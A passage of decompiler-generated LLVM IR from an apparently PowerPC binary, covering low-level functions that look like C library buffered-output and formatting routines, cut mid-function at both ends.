  store i32 %v0_10005350, i32* %v3_10005350, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v0_10005358 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005358 = load i32, i32* @r31, align 4
  %v2_10005358 = add i32 %v1_10005358, 44
  %v3_10005358 = inttoptr i32 %v2_10005358 to i32*
  store i32 %v0_10005358, i32* %v3_10005358, align 4
  %v3_1000535c = load i32, i32* @global_var_1001043c.214, align 4
  store i32 %v3_1000535c, i32* %r0.global-to-local, align 4
  %v1_10005360 = load i32, i32* @r31, align 4
  %v2_10005360 = add i32 %v1_10005360, 52
  %v3_10005360 = inttoptr i32 %v2_10005360 to i32*
  store i32 %v3_1000535c, i32* %v3_10005360, align 4
  %v0_10005364 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10005364, label %dec_label_pc_100053e8, label %dec_label_pc_10005368

dec_label_pc_10005368:                            ; preds = %dec_label_pc_1000532c
  store i32 ptrtoint ([3 x i8]* @global_var_10008c7c.194 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.195 to i32), i32* %r29.global-to-local, align 4
  %v2_10005378 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10005378, i32* @r26, align 4
  store i32 %v2_10005378, i32* @r3, align 4
  %v0_10005388 = call i32 @function_10008c84()
  %v2_10005394 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10005394, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_100100e4.215 to i32), i32* @r29, align 4
  %v0_1000539c = call i32 @function_10008c7c()
  store i32 %v2_10005394, i32* @r3, align 4
  %v0_100053ac = call i32 @function_10008c84()
  %v0_100053b4 = call i32 @function_10008c7c()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_100053bc = load i32, i32* bitcast (i32** @global_var_10010438.216 to i32*), align 4
  store i32 %v3_100053bc, i32* %r0.global-to-local, align 4
  store i32 %v2_10005394, i32* @r3, align 4
  %v1_100053c8 = load i32, i32* @r31, align 4
  %v2_100053c8 = add i32 %v1_100053c8, 32
  %v3_100053c8 = inttoptr i32 %v2_100053c8 to i32*
  store i32 %v3_100053bc, i32* %v3_100053c8, align 4
  %v0_100053cc = load i32, i32* @r31, align 4
  store i32 %v0_100053cc, i32* bitcast (i32** @global_var_10010438.216 to i32*), align 4
  %v0_100053d0 = call i32 @function_10008c84()
  store i32 %v2_10005378, i32* @r3, align 4
  %v0_100053dc = call i32 @function_10008c84()
  br label %dec_label_pc_100053e8

dec_label_pc_100053e4:                            ; preds = %dec_label_pc_10005198, %dec_label_pc_10005184, %dec_label_pc_100051a4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100053e8

dec_label_pc_100053e8:                            ; preds = %dec_label_pc_1000532c, %dec_label_pc_100051e4, %dec_label_pc_10005368, %dec_label_pc_100053e4
  store i32 %v0_10005144, i32* %r0.global-to-local, align 4
  %v0_100053ec = load i32, i32* @r31, align 4
  ret i32 %v0_100053ec

; uselistorder directives
  uselistorder i32 %v1_10005328, { 2, 0, 1 }
  uselistorder i32 %v0_1000529c, { 1, 0 }
  uselistorder i32 %v1_100051e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100051d4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i8 114, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_100053e8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100053e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000532c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005278, { 1, 0 }
  uselistorder label %dec_label_pc_1000520c, { 1, 0 }
  uselistorder label %dec_label_pc_100051dc, { 1, 0 }
  uselistorder label %dec_label_pc_100051c8, { 1, 0 }
  uselistorder label %dec_label_pc_100051b4, { 2, 0, 1 }
}

define i32 @function_10005400(i32 %arg1) local_unnamed_addr {
dec_label_pc_10005400:
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r28, align 4
  %v0_10005414 = call i32 @function_10004b48()
  store i32 %v0_10005414, i32* @r26, align 4
  %v1_10005420 = inttoptr i32 %v0_10005414 to i32*
  %v2_10005420 = load i32, i32* %v1_10005420, align 4
  store i32 %v2_10005420, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_10010114.190 to i32), i32* @r27, align 4
  %v3_10005428 = load i16, i16* @global_var_10010114.190, align 2
  %v4_10005428 = zext i16 %v3_10005428 to i32
  store i32 %v4_10005428, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005430.218 to i32), i32* @lr, align 4
  %v1_1000542c = call i32 @function_1000740c(i32 0)
  %v1_10005430 = sub i32 1, %v1_1000542c
  %v1_10005434 = mul i32 %v1_10005430, 256
  %v0_10005438 = load i32, i32* @r29, align 4
  %v2_10005438 = xor i32 %v1_10005434, %v0_10005438
  %v1_10005440 = trunc i32 %v2_10005438 to i16
  store i16 %v1_10005440, i16* @global_var_10010114.190, align 2
  %v3_10005444 = load i16, i16* @global_var_10010164.191, align 2
  %v4_10005444 = zext i16 %v3_10005444 to i32
  store i32 %v4_10005444, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000544c.219 to i32), i32* @lr, align 4
  %v1_10005448 = call i32 @function_1000740c(i32 1)
  %v1_1000544c = sub i32 1, %v1_10005448
  %v1_10005450 = mul i32 %v1_1000544c, 256
  %v0_10005454 = load i32, i32* @r29, align 4
  %v2_10005454 = xor i32 %v1_10005450, %v0_10005454
  %v1_10005458 = trunc i32 %v2_10005454 to i16
  store i16 %v1_10005458, i16* @global_var_10010164.191, align 2
  %v0_1000545c = load i32, i32* @r25, align 4
  %v1_1000545c = load i32, i32* @r26, align 4
  %v2_1000545c = inttoptr i32 %v1_1000545c to i32*
  store i32 %v0_1000545c, i32* %v2_1000545c, align 4
  ret i32 %v1_10005450

; uselistorder directives
  uselistorder i32 %v1_10005450, { 1, 0 }
  uselistorder i16* @global_var_10010164.191, { 1, 0 }
}

define i32 @function_10005474() local_unnamed_addr {
dec_label_pc_10005474:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000e03c.220 to i32), i32* @r4, align 4
  %v0_10005480 = call i32 @function_10006d8c()
  ret i32 %v0_10005480
}

define i32 @function_10005484(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10005484:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100100e4.215 to i32), i32* @r3, align 4
  store i32 268457120, i32* @lr, align 4
  %v0_1000549c = call i32 @function_10005474()
  store i32 ptrtoint (i32* @global_var_100100fc.195 to i32), i32* @r3, align 4
  store i32 268457132, i32* @lr, align 4
  %v0_100054a8 = call i32 @function_10005474()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_10010438.216 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_100054f49 = icmp eq i32 %storemerge6, 0
  %v1_100054f811 = add i32 %storemerge6, 56
  store i32 %v1_100054f811, i32* %r30.global-to-local, align 4
  br i1 %v3_100054f49, label %dec_label_pc_10005504, label %dec_label_pc_100054b8

dec_label_pc_100054b8:                            ; preds = %dec_label_pc_10005484, %dec_label_pc_100054e4
  %v0_100054b8 = call i32 @function_10008c7c()
  %v3_100054bc = icmp eq i32 %v0_100054b8, 0
  %v0_100054c0 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100054c0, i32* @r3, align 4
  br i1 %v3_100054bc, label %dec_label_pc_100054e4, label %dec_label_pc_100054c8

dec_label_pc_100054c8:                            ; preds = %dec_label_pc_100054b8
  %v0_100054c8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100054c8 = add i32 %v0_100054c8, 8
  %v2_100054c8 = inttoptr i32 %v1_100054c8 to i32*
  %v3_100054c8 = load i32, i32* %v2_100054c8, align 4
  store i32 %v3_100054c8, i32* %r9.global-to-local, align 4
  %v3_100054d0 = inttoptr i32 %v0_100054c8 to i16*
  store i16 48, i16* %v3_100054d0, align 2
  %v0_100054d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100054d4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100054d4 = add i32 %v1_100054d4, 20
  %v3_100054d4 = inttoptr i32 %v2_100054d4 to i32*
  store i32 %v0_100054d4, i32* %v3_100054d4, align 4
  %v0_100054d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100054d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100054d8 = add i32 %v1_100054d8, 24
  %v3_100054d8 = inttoptr i32 %v2_100054d8 to i32*
  store i32 %v0_100054d8, i32* %v3_100054d8, align 4
  %v0_100054dc = load i32, i32* %r9.global-to-local, align 4
  %v1_100054dc = load i32, i32* %r31.global-to-local, align 4
  %v2_100054dc = add i32 %v1_100054dc, 28
  %v3_100054dc = inttoptr i32 %v2_100054dc to i32*
  store i32 %v0_100054dc, i32* %v3_100054dc, align 4
  %v0_100054e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100054e0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100054e0 = add i32 %v1_100054e0, 16
  %v3_100054e0 = inttoptr i32 %v2_100054e0 to i32*
  store i32 %v0_100054e0, i32* %v3_100054e0, align 4
  br label %dec_label_pc_100054e4

dec_label_pc_100054e4:                            ; preds = %dec_label_pc_100054b8, %dec_label_pc_100054c8
  %v1_100054e8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100054e8 = add i32 %v1_100054e8, 52
  %v3_100054e8 = inttoptr i32 %v2_100054e8 to i32*
  store i32 1, i32* %v3_100054e8, align 4
  store i32 268457200, i32* @lr, align 4
  %v0_100054ec = call i32 @function_10005474()
  %v0_100054f0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100054f0 = add i32 %v0_100054f0, 32
  %v2_100054f0 = inttoptr i32 %v1_100054f0 to i32*
  %storemerge = load i32, i32* %v2_100054f0, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_100054f4 = icmp eq i32 %storemerge, 0
  %v1_100054f8 = add i32 %storemerge, 56
  store i32 %v1_100054f8, i32* %r30.global-to-local, align 4
  br i1 %v3_100054f4, label %dec_label_pc_100054f4.dec_label_pc_10005504_crit_edge, label %dec_label_pc_100054b8

dec_label_pc_100054f4.dec_label_pc_10005504_crit_edge: ; preds = %dec_label_pc_100054e4
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_10010438.216 to i32*), align 4
  br label %dec_label_pc_10005504

dec_label_pc_10005504:                            ; preds = %dec_label_pc_100054f4.dec_label_pc_10005504_crit_edge, %dec_label_pc_10005484
  %v0_1000554016 = phi i32 [ %v1_100054f8, %dec_label_pc_100054f4.dec_label_pc_10005504_crit_edge ], [ %v1_100054f811, %dec_label_pc_10005484 ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_100054f4.dec_label_pc_10005504_crit_edge ], [ 0, %dec_label_pc_10005484 ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_100055285 = icmp eq i32 %storemerge12, 0
  br i1 %v3_100055285, label %dec_label_pc_10005530, label %dec_label_pc_10005510

dec_label_pc_10005510:                            ; preds = %dec_label_pc_10005504, %dec_label_pc_10005524
  %v0_10005510 = phi i32 [ %storemerge1, %dec_label_pc_10005524 ], [ %storemerge12, %dec_label_pc_10005504 ]
  %v1_10005510 = inttoptr i32 %v0_10005510 to i16*
  %v2_10005510 = load i16, i16* %v1_10005510, align 2
  %v3_10005510 = zext i16 %v2_10005510 to i32
  store i32 %v0_10005510, i32* @r3, align 4
  %v1_10005518 = and i32 %v3_10005510, 64
  store i32 %v1_10005518, i32* %r9.global-to-local, align 4
  %v3_10005518 = icmp eq i32 %v1_10005518, 0
  br i1 %v3_10005518, label %dec_label_pc_10005524, label %dec_label_pc_10005520

dec_label_pc_10005520:                            ; preds = %dec_label_pc_10005510
  store i32 268457252, i32* @lr, align 4
  %v0_10005520 = call i32 @function_10005544()
  %v0_10005524.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005524

dec_label_pc_10005524:                            ; preds = %dec_label_pc_10005510, %dec_label_pc_10005520
  %v0_10005524 = phi i32 [ %v0_10005510, %dec_label_pc_10005510 ], [ %v0_10005524.pre, %dec_label_pc_10005520 ]
  %v0_1000554017 = phi i32 [ %v0_10005510, %dec_label_pc_10005510 ], [ %v0_10005520, %dec_label_pc_10005520 ]
  %v1_10005524 = add i32 %v0_10005524, 32
  %v2_10005524 = inttoptr i32 %v1_10005524 to i32*
  %storemerge1 = load i32, i32* %v2_10005524, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_10005528 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10005528, label %dec_label_pc_10005530, label %dec_label_pc_10005510

dec_label_pc_10005530:                            ; preds = %dec_label_pc_10005524, %dec_label_pc_10005504
  %v0_10005540 = phi i32 [ %v0_1000554016, %dec_label_pc_10005504 ], [ %v0_1000554017, %dec_label_pc_10005524 ]
  ret i32 %v0_10005540

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_10005510, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @function_10005474, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_10005524, { 1, 0 }
  uselistorder label %dec_label_pc_10005510, { 1, 0 }
  uselistorder label %dec_label_pc_100054e4, { 1, 0 }
  uselistorder label %dec_label_pc_100054b8, { 1, 0 }
}

define i32 @function_10005544() local_unnamed_addr {
dec_label_pc_10005544:
  %v0_1000554c = load i32, i32* @r31, align 4
  %v0_10005550 = load i32, i32* @r3, align 4
  %v1_10005558 = add i32 %v0_10005550, 8
  %v2_10005558 = inttoptr i32 %v1_10005558 to i32*
  %v3_10005558 = load i32, i32* %v2_10005558, align 4
  %v1_1000555c = add i32 %v0_10005550, 16
  %v2_1000555c = inttoptr i32 %v1_1000555c to i32*
  %v3_1000555c = load i32, i32* %v2_1000555c, align 4
  %v2_10005564 = sub i32 %v3_1000555c, %v3_10005558
  store i32 %v2_10005564, i32* @r5, align 4
  %v5_10005564 = icmp eq i32 %v2_10005564, 0
  br i1 %v5_10005564, label %dec_label_pc_10005574, label %dec_label_pc_1000556c

dec_label_pc_1000556c:                            ; preds = %dec_label_pc_10005544
  store i32 %v3_10005558, i32* %v2_1000555c, align 4
  store i32 268457332, i32* @lr, align 4
  %v2_10005570 = inttoptr i32 %v3_10005558 to i16*
  %v3_10005570 = call i32 @function_100096f0(i16* %v2_10005570, i32 %v2_10005564)
  %v0_10005574.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005574

dec_label_pc_10005574:                            ; preds = %dec_label_pc_10005544, %dec_label_pc_1000556c
  %v0_10005574 = phi i32 [ %v0_10005550, %dec_label_pc_10005544 ], [ %v0_10005574.pre, %dec_label_pc_1000556c ]
  %v1_10005574 = add i32 %v0_10005574, 8
  %v2_10005574 = inttoptr i32 %v1_10005574 to i32*
  %v3_10005574 = load i32, i32* %v2_10005574, align 4
  %v1_10005578 = add i32 %v0_10005574, 16
  %v2_10005578 = inttoptr i32 %v1_10005578 to i32*
  %v3_10005578 = load i32, i32* %v2_10005578, align 4
  store i32 %v0_1000554c, i32* @r31, align 4
  %v2_10005580 = sub i32 %v3_10005578, %v3_10005574
  ret i32 %v2_10005580

; uselistorder directives
  uselistorder i32 %v0_10005574, { 1, 0 }
  uselistorder i32 %v3_10005558, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005574, { 1, 0 }
}

define i32 @function_10005594(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10005594:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_100055bc3 = icmp eq i32 %arg3, 0
  %v2_100055c0 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_100055bc3, label %dec_label_pc_100055dc, label %dec_label_pc_100055d0

dec_label_pc_100055b8:                            ; preds = %dec_label_pc_100055d0
  %v1_100055b8 = add i32 %v0_100055b8, -1
  store i32 %v1_100055b8, i32* @r31, align 4
  %v3_100055bc = icmp eq i32 %v1_100055b8, 0
  %v0_100055c8 = load i32, i32* @r29, align 4
  br i1 %v3_100055bc, label %dec_label_pc_100055dc.loopexit, label %dec_label_pc_100055d0

dec_label_pc_100055d0:                            ; preds = %dec_label_pc_10005594, %dec_label_pc_100055b8
  %v0_100055c85 = phi i32 [ %v0_100055c8, %dec_label_pc_100055b8 ], [ %arg1, %dec_label_pc_10005594 ]
  store i32 268457428, i32* @lr, align 4
  %v3_100055d0 = inttoptr i32 %v0_100055c85 to i16*
  %v4_100055d0 = call i32 @function_100097d0(i32 %v2_100055c0, i32 1, i16* %v3_100055d0)
  %v3_100055d4 = icmp eq i32 %v4_100055d0, 1
  %v0_100055b8 = load i32, i32* @r31, align 4
  br i1 %v3_100055d4, label %dec_label_pc_100055b8, label %dec_label_pc_100055dc.loopexit

dec_label_pc_100055dc.loopexit:                   ; preds = %dec_label_pc_100055b8, %dec_label_pc_100055d0
  %v0_100055e0.ph = phi i32 [ %v0_100055b8, %dec_label_pc_100055d0 ], [ 0, %dec_label_pc_100055b8 ]
  %v1_100055e0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100055dc

dec_label_pc_100055dc:                            ; preds = %dec_label_pc_100055dc.loopexit, %dec_label_pc_10005594
  %v1_100055e0 = phi i32 [ 0, %dec_label_pc_10005594 ], [ %v1_100055e0.pre, %dec_label_pc_100055dc.loopexit ]
  %v0_100055e0 = phi i32 [ 0, %dec_label_pc_10005594 ], [ %v0_100055e0.ph, %dec_label_pc_100055dc.loopexit ]
  %v2_100055e0 = sub i32 %v1_100055e0, %v0_100055e0
  ret i32 %v2_100055e0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100055dc.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_100055d0, { 1, 0 }
}

define i32 @function_100055f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100055f4:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_10005608 = and i32 %arg2, 128
  %v3_10005608 = icmp eq i32 %v1_10005608, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_10005608, label %dec_label_pc_10005658, label %dec_label_pc_10005624

dec_label_pc_10005624:                            ; preds = %dec_label_pc_100055f4
  %v0_10005624 = call i32 @function_10006ed8()
  %v0_10005628 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10005624, i32* @r31, align 4
  %v0_10005630 = load i32, i32* %r26.global-to-local, align 4
  %v1_10005634 = load i32, i32* %r30.global-to-local, align 4
  %v2_10005634 = sub i32 %v1_10005634, %v0_10005624
  store i32 %v2_10005634, i32* %r29.global-to-local, align 4
  store i32 %v0_10005624, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_10005634, 1
  br i1 %tmp7, label %dec_label_pc_10005658, label %dec_label_pc_10005644

dec_label_pc_10005644:                            ; preds = %dec_label_pc_10005624
  %v1_10005628 = urem i32 %v0_10005628, 128
  store i32 268457544, i32* @lr, align 4
  %v3_10005644 = trunc i32 %v1_10005628 to i8
  %v4_10005644 = call i32 @function_10005594(i32 %v0_10005630, i8 %v3_10005644, i32 %v2_10005634)
  %v0_10005648 = load i32, i32* @r31, align 4
  store i32 %v0_10005648, i32* %r30.global-to-local, align 4
  %v1_1000564c = load i32, i32* @r29, align 4
  %v4_1000564c = icmp eq i32 %v4_10005644, %v1_1000564c
  store i32 %v4_10005644, i32* @r28, align 4
  br i1 %v4_1000564c, label %dec_label_pc_10005644.dec_label_pc_10005658_crit_edge, label %dec_label_pc_1000567c

dec_label_pc_10005644.dec_label_pc_10005658_crit_edge: ; preds = %dec_label_pc_10005644
  %v0_10005664.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10005658

dec_label_pc_10005658:                            ; preds = %dec_label_pc_10005644.dec_label_pc_10005658_crit_edge, %dec_label_pc_10005624, %dec_label_pc_100055f4
  %v0_10005664 = phi i32 [ %v0_10005664.pre, %dec_label_pc_10005644.dec_label_pc_10005658_crit_edge ], [ %v0_10005630, %dec_label_pc_10005624 ], [ %arg1, %dec_label_pc_100055f4 ]
  %v0_10005660 = phi i32 [ %v0_10005648, %dec_label_pc_10005644.dec_label_pc_10005658_crit_edge ], [ %v0_10005624, %dec_label_pc_10005624 ], [ %arg3, %dec_label_pc_100055f4 ]
  %tmp8 = icmp slt i32 %v0_10005660, 1
  br i1 %tmp8, label %dec_label_pc_10005678, label %dec_label_pc_10005670

dec_label_pc_10005670:                            ; preds = %dec_label_pc_10005658
  %v0_1000565c = load i32, i32* @r27, align 4
  store i32 268457588, i32* @lr, align 4
  %v3_10005670 = inttoptr i32 %v0_10005664 to i16*
  %v4_10005670 = call i32 @function_100097d0(i32 %v0_1000565c, i32 %v0_10005660, i16* %v3_10005670)
  br label %dec_label_pc_10005678

dec_label_pc_10005678:                            ; preds = %dec_label_pc_10005658, %dec_label_pc_10005670
  %v1_10005678 = phi i32 [ 0, %dec_label_pc_10005658 ], [ %v4_10005670, %dec_label_pc_10005670 ]
  %v0_10005678 = load i32, i32* @r28, align 4
  %v2_10005678 = add i32 %v0_10005678, %v1_10005678
  br label %dec_label_pc_1000567c

dec_label_pc_1000567c:                            ; preds = %dec_label_pc_10005644, %dec_label_pc_10005678
  %v0_10005680 = phi i32 [ %v4_10005644, %dec_label_pc_10005644 ], [ %v2_10005678, %dec_label_pc_10005678 ]
  ret i32 %v0_10005680

; uselistorder directives
  uselistorder i32 %v0_10005660, { 1, 0 }
  uselistorder i32 %v2_10005634, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1000567c, { 1, 0 }
  uselistorder label %dec_label_pc_10005678, { 1, 0 }
}

define i32 @function_10005694() local_unnamed_addr {
dec_label_pc_10005694:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_2()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_2()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_10005698 = load i32, i32* @lr, align 4
  store i32 %v0_10005698, i32* %r0.global-to-local, align 4
  %v2_100056a0 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_100056a0, i32* %r30.global-to-local, align 4
  %v0_100056a4 = load i32, i32* @r3, align 4
  store i32 %v0_100056a4, i32* %r24.global-to-local, align 4
  %v0_100056b0 = load i32, i32* @r5, align 4
  store i32 %v0_100056b0, i32* %r31.global-to-local, align 4
  %v0_100056b4 = load i32, i32* @r4, align 4
  store i32 %v0_100056b4, i32* @r29, align 4
  store i32 268457660, i32* @lr, align 4
  %v1_100056b8 = bitcast i8** %stack_var_-200 to i32*
  %v2_100056b8 = call i32 @function_10005d04(i32* %v1_100056b8)
  %tmp72 = icmp sgt i32 %v2_100056b8, -1
  br i1 %tmp72, label %dec_label_pc_100056ec, label %dec_label_pc_100056c4

dec_label_pc_100056c4:                            ; preds = %dec_label_pc_10005694
  %v3_100056c4 = load i8*, i8** %stack_var_-200, align 4
  %v4_100056c4 = ptrtoint i8* %v3_100056c4 to i32
  store i32 %v4_100056c4, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_100056c4, i32* @r3, align 4
  %v0_100056d0 = call i32 @function_10006ed8()
  %v3_100056d4 = icmp eq i32 %v0_100056d0, 0
  br i1 %v3_100056d4, label %dec_label_pc_10005cec, label %dec_label_pc_100056dc

dec_label_pc_100056dc:                            ; preds = %dec_label_pc_100056c4
  %v0_100056dc = load i32, i32* @r31, align 4
  %v0_100056e0 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100056e8.221 to i32), i32* @lr, align 4
  %v3_100056e4 = inttoptr i32 %v0_100056e0 to i16*
  %v4_100056e4 = call i32 @function_100097d0(i32 %v0_100056dc, i32 %v0_100056d0, i16* %v3_100056e4)
  br label %dec_label_pc_10005cec

dec_label_pc_100056ec:                            ; preds = %dec_label_pc_10005694
  %v0_100056f0 = load i32, i32* @r31, align 4
  store i32 268457720, i32* @lr, align 4
  %v2_100056f4 = call i32 @function_10005dc0(i32 %v2_100056a0, i32 %v0_100056f0)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_1000578c = zext i8 %tmp59 to i32
  %v2_10005790 = icmp sgt i32 %tmp60, 0
  %v2_10005794 = ptrtoint i32* %stack_var_-112 to i32
  %v2_100057b8 = ptrtoint i32* %stack_var_-344 to i32
  %v3_100057bc = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_100057f0 = icmp eq i32 %tmp57, 0
  %v2_10005b4c = ptrtoint i32* %stack_var_-328 to i32
  %v2_10005a6c = ptrtoint i32* %stack_var_-340 to i32
  %v2_10005a70 = ptrtoint i32* %stack_var_-336 to i32
  %v5_100058e4 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_100059c0 = icmp eq i32 %tmp57, 1
  %v2_10005964 = icmp ugt i32 %tmp57, 2
  %v4_100058a4 = zext i8 %tmp55 to i32
  %v0_10005cd8.pre = load i32, i32* @r29, align 4
  %v1_100057a4 = mul nuw nsw i32 %v4_1000578c, 8
  %v2_100057a8 = add i32 %v2_10005794, %v1_100057a4
  %v1_100057ac = add i32 %v2_100057a8, -8
  %v1_100057c0 = add i32 %tmp58, 1
  %v2_10005818 = icmp ugt i32 %tmp57, 7
  %v2_100059f8 = icmp ugt i32 %tmp57, 15
  %v2_10005a2c = icmp ugt i32 %tmp57, 17
  %v3_10005a2c = icmp eq i32 %tmp57, 17
  %v2_10005ad4 = icmp ugt i32 %tmp57, 19
  %v3_10005ad4 = icmp eq i32 %tmp57, 19
  %v3_10005b40 = icmp eq i32 %tmp57, 20
  %v1_10005830 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1000e070.223 to i32), i32 -1)
  %v2_10005830 = inttoptr i32 %v1_10005830 to i8*
  %v3_10005970 = icmp eq i32 %tmp57, 3
  %v3_10005980 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_10005cd8

dec_label_pc_10005704.backedge:                   ; preds = %dec_label_pc_10005758, %dec_label_pc_10005710
  %storemerge13.in = phi i32 [ %v1_10005720, %dec_label_pc_10005710 ], [ %v1_10005758, %dec_label_pc_10005758 ]
  %v1_1000571816 = phi i32 [ %v0_10005730, %dec_label_pc_10005710 ], [ %v1_10005758, %dec_label_pc_10005758 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_10005704

dec_label_pc_10005704:                            ; preds = %dec_label_pc_10005704.backedge, %dec_label_pc_10005cd8
  %v0_10005730 = phi i32 [ %v1_1000571816, %dec_label_pc_10005704.backedge ], [ %v0_10005cd8, %dec_label_pc_10005cd8 ]
  %v1_10005720 = phi i32 [ %storemerge13, %dec_label_pc_10005704.backedge ], [ %v0_10005cd8, %dec_label_pc_10005cd8 ]
  %v1_10005704 = inttoptr i32 %v1_10005720 to i8*
  %v2_10005704 = load i8, i8* %v1_10005704, align 1
  %v3_10005704 = zext i8 %v2_10005704 to i32
  store i32 %v3_10005704, i32* %r0.global-to-local, align 4
  %v3_10005708 = icmp eq i8 %v2_10005704, 0
  br i1 %v3_10005708, label %dec_label_pc_10005718, label %dec_label_pc_10005710

